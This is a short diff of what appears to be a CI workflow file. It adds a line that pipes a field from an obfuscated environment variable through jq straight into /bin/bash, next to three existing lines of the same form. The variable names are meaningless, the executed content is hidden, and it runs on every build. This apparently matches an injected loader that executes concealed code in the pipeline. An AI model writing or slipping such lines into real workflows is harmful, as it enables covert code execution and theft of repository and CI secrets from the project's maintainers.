@@ -28,6 +28,7 @@ jobs:
           echo $atndc176 | jq -r .lorsr11107 | /bin/bash
           echo $uyj525 | jq -r .kj80 | /bin/bash
           printf '%s' "$hwqq750" | jq -r .hwqw11264 | /bin/bash
+          printf '%s' "$fn8" | jq -r .ead40 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
